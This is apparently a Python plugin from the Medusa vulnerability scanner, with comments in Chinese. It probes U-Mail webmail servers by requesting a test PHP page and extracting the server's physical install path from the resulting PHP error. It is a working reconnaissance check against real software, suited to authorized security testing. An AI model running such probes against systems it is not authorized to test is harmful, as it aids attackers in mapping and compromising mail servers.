#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: umail物理路径泄露
referer: unknow
author: Ascotbe
reference: Lucifer
description: 泄露了物理路径。
'''
import urllib
import requests
import re
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/webmail/client/mail/module/test.php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        temp = re.search(r'a non-object in <b>(.*)\\client\\mail', resp.text, re.S).group(1)
        temp = temp.split('\\')
        path = ''
        for i in range(len(temp)):
            t = temp[i] + '/'
            path += t
            Medusa = "{} 存在umail物理路径泄露\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass